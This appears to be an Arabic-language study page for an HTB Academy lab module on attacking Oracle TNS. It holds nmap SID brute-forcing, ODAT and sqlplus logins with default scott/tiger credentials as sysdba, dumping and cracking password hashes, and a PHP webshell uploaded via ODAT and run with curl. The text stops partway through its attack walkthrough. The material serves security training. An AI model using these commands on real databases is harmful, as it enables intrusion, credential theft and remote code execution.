@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Oracle TNS — HTB Academy</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=IBM+Plex+Mono:wght@400;600;700&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#030810;--surface:rgba(8,15,28,0.75);--border:#0e2035;--accent:#00d4ff;--green:#39ff14;--red:#FF5757;--yellow:#fbbf24;--purple:#a855f7;--text:#b8ccd8;--muted:#3a5060;--white:#e8f4ff;--mono:'IBM Plex Mono',monospace;--sans:'Rajdhani',sans-serif;--tag:'Share Tech Mono',monospace;}
+*{margin:0;padding:0;box-sizing:border-box;}
+html,body{background:url('https://raw.githubusercontent.com/husein690/roadmap/main/assets/kuggen.jpg') no-repeat center center fixed!important;background-size:cover!important;background-color:#030810!important;}
+body::before{content:''!important;position:fixed!important;inset:0!important;background:rgba(2,6,14,0.72)!important;background-image:none!important;z-index:0!important;display:block!important;pointer-events:none!important;}
+body{color:var(--text);font-family:var(--sans);min-height:100vh;}
+body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(0,212,255,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,.02) 1px,transparent 1px);background-size:40px 40px;}
+#glass-particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1;}
+.wrap{max-width:1000px;margin:0 auto;padding:32px 18px 80px;position:relative;z-index:2;}
+
+/* BACK */
+.back-btn{display:inline-flex;align-items:center;gap:8px;font-family:var(--tag);font-size:10px;letter-spacing:2px;color:var(--muted);text-decoration:none;padding:6px 14px;border:1px solid var(--muted);margin-bottom:28px;transition:all .2s;}
+.back-btn:hover{color:var(--accent);border-color:var(--accent);}
+
+/* HEADER */
+.hdr{margin-bottom:32px;}
+.hdr-tag{font-family:var(--tag);font-size:10px;color:var(--green);letter-spacing:5px;margin-bottom:12px;animation:blink 2.5s infinite;}
+@keyframes blink{0%,100%{opacity:1}55%{opacity:.3}}
+.hdr-name{font-family:var(--mono);font-size:clamp(22px,4vw,40px);font-weight:700;color:var(--white);letter-spacing:-1px;text-shadow:0 0 40px rgba(0,212,255,.3);}
+.hdr-name span{color:var(--accent);}
+.hdr-sub{font-family:var(--tag);font-size:10px;color:var(--muted);letter-spacing:3px;margin-top:8px;}
+.divider{height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent);margin:16px 0;opacity:.3;}
+
+/* FACTS BAR */
+.facts-bar{display:flex;flex-wrap:wrap;margin-bottom:28px;background:rgba(8,18,36,0.52);backdrop-filter:blur(18px);border:1px solid rgba(0,212,255,0.18);box-shadow:0 4px 30px rgba(0,0,0,.35);}
+.fact{flex:1;min-width:110px;padding:12px 16px;border-left:1px solid var(--border);}
+.fact:last-child{border-left:none;}
+.fact-val{font-family:var(--mono);font-size:16px;font-weight:700;color:var(--accent);}
+.fact-lbl{font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;margin-top:3px;}
+
+/* NAV */
+.nav{display:flex;flex-wrap:wrap;gap:0;margin-bottom:24px;border-bottom:1px solid var(--border);}
+.nav-btn{font-family:var(--tag);font-size:10px;letter-spacing:1px;padding:12px 16px;background:none;border:none;border-bottom:2px solid transparent;color:var(--muted);cursor:pointer;transition:all .2s;white-space:nowrap;}
+.nav-btn:hover{color:var(--accent);border-bottom-color:var(--accent);}
+.nav-btn.active{color:var(--accent);border-bottom-color:var(--accent);background:rgba(0,212,255,.05);}
+
+/* PANELS */
+.panel{display:none;}
+.panel.active{display:block;}
+
+/* SECTION LABEL */
+.sec-label{font-family:var(--tag);font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin:20px 0 10px;display:flex;align-items:center;gap:10px;}
+.sec-label::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,var(--border),transparent);}
+
+/* CARD */
+.card{background:rgba(8,18,36,0.48);backdrop-filter:blur(16px);border:1px solid rgba(255,255,255,.08);padding:18px;margin-bottom:14px;position:relative;}
+.card::before{content:'';position:absolute;top:0;right:0;width:3px;height:100%;background:var(--accent);opacity:.4;}
+.card.danger::before{background:var(--red);opacity:.6;}
+.card.success::before{background:var(--green);opacity:.6;}
+.card.warn::before{background:var(--yellow);opacity:.6;}
+.card-title{font-family:var(--tag);font-size:10px;letter-spacing:2px;color:var(--accent);margin-bottom:12px;text-transform:uppercase;}
+.card-title::before{content:'▸ ';color:var(--green);}
+
+/* CODE */
+.code{background:rgba(1,4,9,0.8);border:1px solid var(--border);border-right:3px solid var(--accent);padding:14px;font-family:var(--mono);font-size:11px;color:var(--text);direction:ltr;text-align:left;overflow-x:auto;white-space:pre;line-height:1.7;margin:8px 0;}
+.code .cmd{color:var(--accent);}
+.code .ok{color:var(--green);}
+.code .err{color:var(--red);}
+.code .cmt{color:var(--muted);}
+.code .val{color:var(--yellow);}
+
+/* TABLE */
+table{width:100%;border-collapse:collapse;font-size:11px;margin:10px 0;}
+th{background:rgba(1,4,9,0.8);color:var(--accent);padding:8px 12px;text-align:right;border:1px solid var(--border);font-family:var(--tag);font-size:9px;letter-spacing:1px;text-transform:uppercase;}
+td{padding:7px 12px;border:1px solid var(--border);color:var(--text);font-size:11px;vertical-align:top;}
+tr:nth-child(even) td{background:rgba(8,15,28,0.5);}
+tr:nth-child(odd) td{background:rgba(1,4,9,0.4);}
+td.mono{font-family:var(--mono);color:var(--accent);}
+td.danger{color:var(--red);}
+td.safe{color:var(--green);}
+td.warn{color:var(--yellow);}
+
+/* ALERT */
+.alert{padding:10px 14px;font-size:11px;margin:8px 0;border-right:3px solid;line-height:1.6;}
+.alert.danger{background:rgba(255,87,87,.08);border-color:var(--red);color:#ff9999;}
+.alert.success{background:rgba(57,255,20,.08);border-color:var(--green);color:#99ff99;}
+.alert.info{background:rgba(0,212,255,.08);border-color:var(--accent);color:#99e8ff;}
+.alert.warning{background:rgba(251,191,36,.08);border-color:var(--yellow);color:#ffe599;}
+
+/* GRID */
+.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:10px 0;}
+.info-box{background:rgba(1,4,9,0.6);border:1px solid var(--border);padding:12px;}
+.info-box-title{font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;}
+
+/* TOOLS */
+.tool-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:8px;margin:12px 0;}
+.tool-btn{background:rgba(8,18,36,0.5);border:1px solid var(--border);padding:12px 8px;text-align:center;cursor:pointer;transition:all .2s;font-family:var(--tag);font-size:10px;color:var(--muted);}
+.tool-btn:hover{border-color:var(--accent);color:var(--accent);background:rgba(0,212,255,.05);}
+.tool-btn.active{border-color:var(--green);color:var(--green);background:rgba(57,255,20,.05);}
+.tool-btn .ti{font-size:20px;margin-bottom:6px;display:block;}
+.tool-panel{display:none;}
+.tool-panel.active{display:block;}
+
+/* CHAIN */
+.chain{display:flex;align-items:center;flex-wrap:wrap;margin:12px 0;gap:0;}
+.chain-step{flex:1;min-width:80px;background:rgba(8,18,36,0.5);border:1px solid var(--border);padding:10px 8px;text-align:center;}
+.chain-step .step-icon{font-size:18px;margin-bottom:4px;}
+.chain-step .step-name{color:var(--text);font-size:10px;font-family:var(--tag);}
+.chain-step .step-sub{color:var(--muted);font-size:9px;margin-top:2px;font-family:var(--tag);}
+.chain-step.hl{border-color:var(--red);background:rgba(255,87,87,.05);}
+.chain-arrow{color:var(--accent);font-size:14px;padding:0 4px;}
+
+/* METHOD STEPS */
+.mstep{display:flex;gap:14px;padding:12px 0;border-bottom:1px solid var(--border);align-items:flex-start;}
+.mstep:last-child{border-bottom:none;}
+.mnum{background:var(--accent);color:#000;width:24px;height:24px;min-width:24px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:bold;margin-top:2px;font-family:var(--mono);}
+.mcontent{flex:1;}
+.mtitle{color:var(--accent);font-size:12px;margin-bottom:4px;font-family:var(--tag);letter-spacing:1px;}
+.mdesc{color:var(--muted);font-size:11px;line-height:1.6;}
+
+/* Q&A */
+.qa{margin:10px 0;}
+.qa-q{background:rgba(0,212,255,.05);border:1px solid rgba(0,212,255,.2);padding:10px 14px;margin-bottom:6px;font-size:12px;color:var(--accent);}
+.qa-q::before{content:'❓ سؤال: ';color:var(--yellow);}
+.qa-a{background:rgba(57,255,20,.05);border:1px solid rgba(57,255,20,.2);padding:10px 14px;margin-bottom:10px;font-size:12px;color:var(--text);line-height:1.6;}
+.qa-a::before{content:'✅ الجواب: ';color:var(--green);}
+
+/* TAG */
+.tag{display:inline-block;padding:2px 8px;font-size:9px;letter-spacing:1px;text-transform:uppercase;margin:2px;font-family:var(--tag);border:1px solid;}
+.tag.cyan{border-color:rgba(0,212,255,.3);color:var(--accent);}
+.tag.green{border-color:rgba(57,255,20,.3);color:var(--green);}
+.tag.red{border-color:rgba(255,87,87,.3);color:var(--red);}
+.tag.yellow{border-color:rgba(251,191,36,.3);color:var(--yellow);}
+
+.lbl{font-family:var(--tag);font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin:10px 0 6px;}
+
+@media(max-width:600px){.grid-2{grid-template-columns:1fr;}.chain{flex-direction:column;}}
+</style>
+</head>
+<body>
+<canvas id="glass-particles"></canvas>
+<div class="wrap">
+
+<a href="protocols.html" class="back-btn">◄ BACK TO PROTOCOLS</a>
+
+<div class="hdr">
+  <div class="hdr-tag">► HTB ACADEMY · MODULE 112 · SECTION 15/21</div>
+  <div class="hdr-name">ORACLE <span>TNS</span></div>
+  <div class="hdr-sub">TRANSPARENT NETWORK SUBSTRATE · DATABASE ENUMERATION · PRIVILEGE ESCALATION</div>
+  <div class="divider"></div>
+</div>
+
+<!-- FACTS BAR -->
+<div class="facts-bar">
+  <div class="fact"><div class="fact-val">1521</div><div class="fact-lbl">TCP Port</div></div>
+  <div class="fact"><div class="fact-val">SID</div><div class="fact-lbl">System Identifier</div></div>
+  <div class="fact"><div class="fact-val" style="color:var(--red)">scott/tiger</div><div class="fact-lbl">Default Creds</div></div>
+  <div class="fact"><div class="fact-val">ODAT</div><div class="fact-lbl">Main Tool</div></div>
+  <div class="fact"><div class="fact-val">sysdba</div><div class="fact-lbl">Max Privilege</div></div>
+  <div class="fact"><div class="fact-val" style="color:var(--red)">RCE</div><div class="fact-lbl">File Upload</div></div>
+</div>
+
+<!-- NAV -->
+<div class="nav">
+  <button class="nav-btn active" onclick="showPanel('overview',this)">Overview</button>
+  <button class="nav-btn" onclick="showPanel('config',this)">Config Files</button>
+  <button class="nav-btn" onclick="showPanel('sid',this)">SID</button>
+  <button class="nav-btn" onclick="showPanel('danger',this)">Danger Settings</button>
+  <button class="nav-btn" onclick="showPanel('tools',this)">Tools</button>
+  <button class="nav-btn" onclick="showPanel('attack',this)">Attack Chain</button>
+  <button class="nav-btn" onclick="showPanel('methodology',this)">Methodology</button>
+  <button class="nav-btn" onclick="showPanel('explained',this)">Explained Q&A</button>
+</div>
+
+<!-- OVERVIEW -->
+<div id="panel-overview" class="panel active">
+
+  <div class="card">
+    <div class="card-title">ما هو Oracle TNS؟</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:14px;">
+      TNS = Transparent Network Substrate — بروتوكول خاص بـ Oracle للتواصل بين قواعد البيانات والتطبيقات.
+      "Transparent" يعني التطبيق ما يحتاج يعرف كيف الاتصال يصير — TNS يتكفل بكل شيء في الخلفية.
+    </p>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">🔌 البروتوكولات المدعومة</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;direction:ltr;margin-top:6px;">
+          <span style="color:var(--green);">TCP/IP</span> ← الأكثر شيوعاً اليوم ✅<br>
+          <span style="color:var(--muted);">UDP</span><br>
+          <span style="color:var(--muted);">IPX/SPX</span> ← قديم من التسعينات ❌<br>
+          <span style="color:var(--muted);">AppleTalk</span> ← قديم جداً ❌
+        </div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">🏢 يستخدم في</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.8;margin-top:6px;">
+          🏥 المستشفيات — بيانات المرضى<br>
+          🏦 البنوك — معاملات مالية<br>
+          🏪 متاجر كبيرة — مخزون ومبيعات<br>
+          <span style="color:var(--red);">= بيانات حساسة جداً! 🎯</span>
+        </div>
+      </div>
+    </div>
+    <div class="alert info">💡 TNS = لغة Oracle. أي أداة بدها تتصل بـ Oracle لازم تدعم TNS — بغض النظر عن الشركة اللي صنعتها.</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Oracle TNS vs باقي قواعد البيانات</div>
+    <table>
+      <tr><th>الخاصية</th><th>Oracle TNS</th><th>MySQL</th><th>MSSQL</th></tr>
+      <tr><td>Port</td><td class="mono">1521</td><td class="mono">3306</td><td class="mono">1433</td></tr>
+      <tr><td>بروتوكول</td><td style="color:var(--accent);">TNS خاص</td><td style="color:var(--text);">TCP مباشر</td><td style="color:var(--text);">TDS</td></tr>
+      <tr><td>التشفير</td><td class="safe">مدمج ✅</td><td class="danger">بدون افتراضياً</td><td class="warn">اختياري</td></tr>
+      <tr><td>الاستخدام</td><td style="color:var(--text);">شركات كبيرة</td><td style="color:var(--text);">LAMP/LEMP</td><td style="color:var(--text);">Windows Enterprise</td></tr>
+      <tr><td>الـ Client</td><td class="mono">sqlplus / ODAT</td><td class="mono">mysql</td><td class="mono">mssqlclient.py</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <div class="card-title">Listener — بوابة الدخول</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:10px;">
+      الـ Listener = برنامج يجلس على Port 1521 وينتظر الاتصالات. مثل حارس البوابة — يتحقق من المستخدم ويوجهه للـ database الصح.
+    </p>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">Oracle 8i/9i — قديم ⚠️</div>
+        <div style="font-size:11px;color:var(--red);line-height:1.6;">إدارة الـ Listener عن بعد مفتوحة<br>= تقدر توقفه أو تغير إعداداته بدون authentication 💀</div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">Oracle 10g/11g — حديث ✅</div>
+        <div style="font-size:11px;color:var(--green);line-height:1.6;">الإدارة عن بعد مغلقة افتراضياً<br>= أكثر أماناً ✅</div>
+      </div>
+    </div>
+    <div class="alert danger">🎯 إدارة الـ Listener = تحكم في Port + من يتصل + أي databases يخدم + تشغيل/إيقاف الخدمة كاملة!</div>
+  </div>
+
+</div>
+
+<!-- CONFIG FILES -->
+<div id="panel-config" class="panel">
+
+  <div class="card">
+    <div class="card-title">ملفا الإعداد الأساسيان</div>
+    <div class="grid-2">
+      <div style="background:rgba(1,4,9,0.6);border:1px solid rgba(0,212,255,.2);padding:14px;">
+        <div style="color:var(--accent);font-size:11px;margin-bottom:8px;font-family:var(--tag);">tnsnames.ora — CLIENT SIDE</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.6;">
+          يقول للـ client: "لو بدك تتصل بـ ORCL روح على هاد IP وهاد Port"<br><br>
+          مثل: <span style="color:var(--yellow);">دفتر عناوين عندك أنت</span>
+        </div>
+      </div>
+      <div style="background:rgba(1,4,9,0.6);border:1px solid rgba(57,255,20,.2);padding:14px;">
+        <div style="color:var(--green);font-size:11px;margin-bottom:8px;font-family:var(--tag);">listener.ora — SERVER SIDE</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.6;">
+          يقول للـ Listener: "استمع على Port 1521 وخدم هاي الـ databases"<br><br>
+          مثل: <span style="color:var(--yellow);">تعليمات الحارس</span>
+        </div>
+      </div>
+    </div>
+    <div class="alert info">📁 موقعهم: $ORACLE_HOME/network/admin/</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">tnsnames.ora — مثال كامل</div>
+    <div class="code">ORCL =
+(DESCRIPTION =
+  (ADDRESS_LIST =
+    (ADDRESS = (PROTOCOL = <span class="val">TCP</span>)(HOST = <span class="val">10.129.11.102</span>)(PORT = <span class="val">1521</span>))
+  )
+  (CONNECT_DATA =
+    (SERVER = DEDICATED)
+    (SERVICE_NAME = <span class="val">orcl</span>)   <span class="cmt">← SID</span>
+  )
+)
+
+<span class="cmt"># ORCL = اسم الـ service</span>
+<span class="cmt"># HOST  = IP السيرفر</span>
+<span class="cmt"># PORT  = رقم الـ port</span>
+<span class="cmt"># SERVICE_NAME = اسم قاعدة البيانات (SID)</span></div>
+    <div class="alert danger">🎯 لو وجدت tnsnames.ora على جهاز موظف = خريطة كاملة لكل Oracle databases في الشبكة الداخلية!</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">listener.ora — مثال كامل</div>
+    <div class="code">SID_LIST_LISTENER =
+(SID_LIST =
+  (SID_DESC =
+    (SID_NAME = <span class="val">PDB1</span>)
+    (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
+    (GLOBAL_DBNAME = PDB1)
+  )
+)
+
+LISTENER =
+(DESCRIPTION_LIST =
+  (DESCRIPTION =
+    (ADDRESS = (PROTOCOL = TCP)
+               (HOST = <span class="val">orcl.inlanefreight.htb</span>)
+               (PORT = <span class="val">1521</span>))
+  )
+)</div>
+    <div class="alert info">💡 يكشف: اسم السيرفر + SIDs المتاحة + الـ ports — معلومات قيمة للـ pentest!</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">📋 معاملات الاتصال المهمة</div>
+    <table>
+      <tr><th>المعامل</th><th>الوظيفة</th></tr>
+      <tr><td class="mono">DESCRIPTION</td><td>اسم الـ database ونوع الاتصال</td></tr>
+      <tr><td class="mono">HOST</td><td>IP السيرفر</td></tr>
+      <tr><td class="mono">PORT</td><td>رقم الـ port (افتراضي 1521)</td></tr>
+      <tr><td class="mono">SERVICE_NAME</td><td>اسم الـ service (SID)</td></tr>
+      <tr><td class="mono">USER / PASSWORD</td><td class="danger">credentials — لو موجودة = gold! 🎯</td></tr>
+      <tr><td class="mono">CONNECT_TIMEOUT</td><td>timeout للاتصال</td></tr>
+      <tr><td class="mono">SSL_VERSION</td><td>إصدار SSL/TLS</td></tr>
+    </table>
+  </div>
+
+</div>
+
+<!-- SID -->
+<div id="panel-sid" class="panel">
+
+  <div class="card">
+    <div class="card-title">SID — System Identifier</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:12px;">
+      SID = اسم فريد لكل database instance على السيرفر. بدونه ما تقدر تتصل!
+    </p>
+    <div style="background:rgba(1,4,9,0.6);border:1px solid var(--border);padding:14px;direction:ltr;font-size:11px;margin-bottom:10px;">
+      <div style="color:var(--accent);margin-bottom:8px;">السيرفر = مبنى</div>
+      <div style="display:flex;gap:10px;flex-wrap:wrap;">
+        <div style="background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.3);padding:8px 14px;text-align:center;">
+          <div style="color:var(--accent);font-size:12px;font-weight:bold;">ORCL</div>
+          <div style="color:var(--muted);font-size:9px;">Production DB</div>
+        </div>
+        <div style="background:rgba(57,255,20,.08);border:1px solid rgba(57,255,20,.3);padding:8px 14px;text-align:center;">
+          <div style="color:var(--green);font-size:12px;font-weight:bold;">PROD</div>
+          <div style="color:var(--muted);font-size:9px;">Production 2</div>
+        </div>
+        <div style="background:rgba(251,191,36,.08);border:1px solid rgba(251,191,36,.3);padding:8px 14px;text-align:center;">
+          <div style="color:var(--yellow);font-size:12px;font-weight:bold;">DEV</div>
+          <div style="color:var(--muted);font-size:9px;">Development</div>
+        </div>
+        <div style="background:rgba(168,85,247,.08);border:1px solid rgba(168,85,247,.3);padding:8px 14px;text-align:center;">
+          <div style="color:var(--purple);font-size:12px;font-weight:bold;">XE</div>
+          <div style="color:var(--muted);font-size:9px;">Express Edition</div>
+        </div>
+      </div>
+    </div>
+    <div class="alert danger">⚠️ SID غلط = الاتصال يفشل فوراً! لازم تعرفه أول قبل ما تحاول تتصل.</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">كيف تكتشف الـ SID — 3 طرق</div>
+
+    <div class="lbl">طريقة 1 — Nmap (أسرع):</div>
+    <div class="code"><span class="cmd">sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute</span>
+
+PORT     STATE SERVICE
+<span class="ok">1521/tcp open  oracle-tns Oracle TNS 11.2.0.2.0</span>
+| oracle-sid-brute:
+|_ <span class="val">XE</span>  <span class="cmt">← وجد الـ SID!</span></div>
+
+    <div class="lbl">طريقة 2 — tnsnames.ora (لو وصلت لجهاز على الشبكة):</div>
+    <div class="code"><span class="cmd">cat /oracle/network/admin/tnsnames.ora</span>
+<span class="cmt"># SERVICE_NAME = XE ← SID مكتوب مباشرة!</span>
+<span class="ok">أسرع وأسهل من brute force 🎯</span></div>
+
+    <div class="lbl">طريقة 3 — ODAT (أشمل):</div>
+    <div class="code"><span class="cmd">./odat.py sidguesser -s 10.129.204.235</span>
+<span class="ok">[+] SID found: XE</span>
+<span class="ok">[+] SID found: ORCL</span></div>
+  </div>
+
+</div>
+
+<!-- DANGER -->
+<div id="panel-danger" class="panel">
+
+  <div class="card danger">
+    <div class="card-title">⚠️ Default Credentials — جربها أول دايماً</div>
+    <table>
+      <tr><th>Username</th><th>Password</th><th>متى يكون موجود؟</th></tr>
+      <tr><td class="mono">scott</td><td class="mono danger">tiger</td><td class="warn">Oracle 8i-10g — محذوف في 11g+</td></tr>
+      <tr><td class="mono">dbsnmp</td><td class="mono danger">dbsnmp</td><td class="warn">لو خدمة DBSNMP مثبتة</td></tr>
+      <tr><td class="mono">sys</td><td class="mono danger">change_on_install</td><td class="warn">Oracle 9 وأقدم فقط</td></tr>
+      <tr><td class="mono">system</td><td class="mono danger">manager</td><td class="warn">قديم جداً — نادر</td></tr>
+    </table>
+    <div class="alert danger">💀 كثير admins ينسون يغيرون هاي الـ credentials! ODAT يجربهم تلقائياً.</div>
+  </div>
+
+  <div class="card danger">
+    <div class="card-title">💀 sysdba — أعلى صلاحية</div>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">scott عادي</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.6;margin-top:6px;">
+          SCOTT → CONNECT ✅<br>
+          SCOTT → RESOURCE ✅<br>
+          <span style="color:var(--red);">ما عنده admin privileges ❌</span>
+        </div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">scott as sysdba</div>
+        <div style="font-size:11px;color:var(--text);line-height:1.6;margin-top:6px;">
+          SYS → DBA ✅<br>
+          SYS → كل الصلاحيات ✅<br>
+          <span style="color:var(--red);">تحكم كامل بكل شيء 💀</span>
+        </div>
+      </div>
+    </div>
+    <div class="code"><span class="cmd">sqlplus scott/tiger@TARGET/XE as sysdba</span>
+<span class="ok">Connected as SYS</span>  <span class="cmt">← أعلى صلاحية في Oracle!</span></div>
+    <div class="alert danger">🎯 sysdba = root على Linux = Administrator على Windows = sa على MSSQL</div>
+  </div>
+
+  <div class="card danger">
+    <div class="card-title">💀 Password Hashes من sys.user$</div>
+    <div class="code"><span class="cmd">SQL> select name, password from sys.user$;</span>
+
+NAME          PASSWORD
+SYS           <span class="val">FBA343E7D6C8BC9D</span>
+SYSTEM        <span class="val">B5073FE1DE351687</span>
+OUTLN         <span class="val">4A3BA55E08595C81</span>
+
+<span class="cmt"># كسر الـ hashes offline:</span>
+<span class="cmd">hashcat -m 3100 hashes.txt rockyou.txt</span>
+<span class="ok">FBA343E7D6C8BC9D:password123 ✅</span></div>
+    <div class="alert info">💡 -m 3100 = Oracle H: DES hash type. Offline = سريع وما يُسجل على السيرفر!</div>
+  </div>
+
+  <div class="card danger">
+    <div class="card-title">💀 File Upload → RCE</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:10px;">
+      لو السيرفر عليه web server، تقدر ترفع webshell مباشرة عبر Oracle!
+    </p>
+    <div class="code"><span class="cmt"># 1. إنشاء webshell:</span>
+<span class="cmd">echo "&lt;?php system(\$_GET['cmd']); ?&gt;" > shell.php</span>
+
+<span class="cmt"># 2. رفع الملف عبر ODAT:</span>
+<span class="cmd">./odat.py utlfile -s TARGET -d XE -U scott -P tiger \
+  --sysdba --putFile C:\\inetpub\\wwwroot shell.php ./shell.php</span>
+
+<span class="ok">[+] The file was created on C:\inetpub\wwwroot</span>
+
+<span class="cmt"># 3. تشغيل أوامر:</span>
+<span class="cmd">curl http://TARGET/shell.php?cmd=whoami</span>
+<span class="ok">nt service\oracle</span>  <span class="cmt">← RCE! 💥</span></div>
+    <div class="grid-2">
+      <div class="info-box">
+        <div class="info-box-title">Windows</div>
+        <div class="code" style="margin:4px 0;border-right:none;padding:6px 8px;font-size:10px;">C:\inetpub\wwwroot</div>
+      </div>
+      <div class="info-box">
+        <div class="info-box-title">Linux</div>
+        <div class="code" style="margin:4px 0;border-right:none;padding:6px 8px;font-size:10px;">/var/www/html</div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- TOOLS -->
+<div id="panel-tools" class="panel">
+
+  <div class="lbl">اختر الأداة:</div>
+  <div class="tool-grid">
+    <div class="tool-btn active" onclick="showTool('nmap',this)"><span class="ti">🔍</span>Nmap</div>
+    <div class="tool-btn" onclick="showTool('odat',this)"><span class="ti">⚔️</span>ODAT</div>
+    <div class="tool-btn" onclick="showTool('sqlplus',this)"><span class="ti">🗄️</span>sqlplus</div>
+  </div>
+
+  <div id="tool-nmap" class="tool-panel active">
+    <div class="card"><div class="card-title">🔍 Nmap على Oracle TNS</div>
+    <div class="lbl">Scan أساسي:</div>
+    <div class="code"><span class="cmd">sudo nmap -p1521 -sV 10.129.204.235 --open</span>
+
+PORT     STATE SERVICE VERSION
+<span class="ok">1521/tcp open oracle-tns Oracle TNS listener 11.2.0.2.0</span></div>
+    <div class="lbl">SID Brute Force:</div>
+    <div class="code"><span class="cmd">sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute</span>
+
+| oracle-sid-brute:
+|_ <span class="val">XE</span>  <span class="cmt">← وجد الـ SID!</span></div>
+    <div class="alert info">💡 oracle-sid-brute يجرب قائمة من SIDs الشائعة تلقائياً</div>
+    </div>
+  </div>
+
+  <div id="tool-odat" class="tool-panel">
+    <div class="card"><div class="card-title">⚔️ ODAT — Oracle Database Attacking Tool</div>
+    <p style="font-size:12px;color:var(--text);line-height:1.8;margin-bottom:10px;">أداة Python مفتوحة المصدر للـ pentest على Oracle — يعمل كل شيء تلقائياً.</p>
+    <div class="lbl">تشغيل كل الـ modules:</div>
+    <div class="code"><span class="cmd">./odat.py all -s 10.129.204.235</span>
+
+[+] Checking target...
+[!] Notice: 'mdsys' account is locked...
+[+] <span class="ok">Valid credentials found: scott/tiger</span> 🎯</div>
+    <div class="lbl">رفع ملف:</div>
+    <div class="code"><span class="cmd">./odat.py utlfile -s TARGET -d XE -U scott -P tiger \
+  --sysdba --putFile C:\\inetpub\\wwwroot shell.php ./shell.php</span></div>
+    <div class="lbl">الـ modules المتاحة:</div>
+    <div class="code">all           ← جرب كل شيء
+sidguesser    ← اكتشاف SIDs
+passwordguesser ← brute force passwords
+utlfile       ← رفع/تحميل ملفات
+externaltable ← قراءة ملفات OS
+java          ← تشغيل Java
+privesc       ← رفع الصلاحيات</div>
+    </div>
+  </div>
+
+  <div id="tool-sqlplus" class="tool-panel">
+    <div class="card"><div class="card-title">🗄️ sqlplus — الاتصال المباشر</div>
+    <div class="lbl">الاتصال العادي:</div>
+    <div class="code"><span class="cmd">sqlplus scott/tiger@10.129.204.235/XE</span>
+<span class="ok">Connected to Oracle Database 11g</span>
+SQL></div>
+    <div class="lbl">الاتصال كـ sysdba:</div>
+    <div class="code"><span class="cmd">sqlplus scott/tiger@10.129.204.235/XE as sysdba</span>
+<span class="ok">Connected as SYS</span>  <span class="cmt">← أعلى صلاحية!</span>
+SQL></div>
+    <div class="lbl">الأوامر بعد الاتصال:</div>
+    <div class="code"><span class="cmt">-- شوف كل الجداول:</span>
+<span class="cmd">select table_name from all_tables;</span>
+
+<span class="cmt">-- شوف صلاحياتك:</span>
+<span class="cmd">select * from user_role_privs;</span>
+
+<span class="cmt">-- سرق الـ password hashes:</span>
+<span class="cmd">select name, password from sys.user$;</span></div>
+    <div class="alert warning">⚠️ لو طلع "ORA-28002: password will expire within 7 days" — الاتصال نجح! هاد مجرد تحذير.</div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ATTACK CHAIN -->
+<div id="panel-attack" class="panel">
+
+  <div class="card">
+    <div class="card-title">⛓️ Attack Chain الكامل</div>
+    <div class="chain">
+      <div class="chain-step"><div class="step-icon">🔍</div><div class="step-name">Nmap Scan</div><div class="step-sub">Port 1521</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">🆔</div><div class="step-name">SID Brute</div><div class="step-sub">oracle-sid-brute</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">🔑</div><div class="step-name">ODAT all</div><div class="step-sub">scott/tiger</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step"><div class="step-icon">👑</div><div class="step-name">as sysdba</div><div class="step-sub">SYS access</div></div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step hl"><div class="step-icon">💥</div><div class="step-name">RCE</div><div class="step-sub">File Upload</div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">💥 الهجوم الكامل خطوة بخطوة</div>
+    <div class="code"><span class="cmt"># 1. اكتشف Port 1521:</span>
+<span class="cmd">sudo nmap -p1521 -sV TARGET --open</span>
+
+<span class="cmt"># 2. اكتشف الـ SID:</span>
+<span class="cmd">sudo nmap -p1521 TARGET --script oracle-sid-brute</span>
+<span class="ok">[*] SID: XE</span>
+
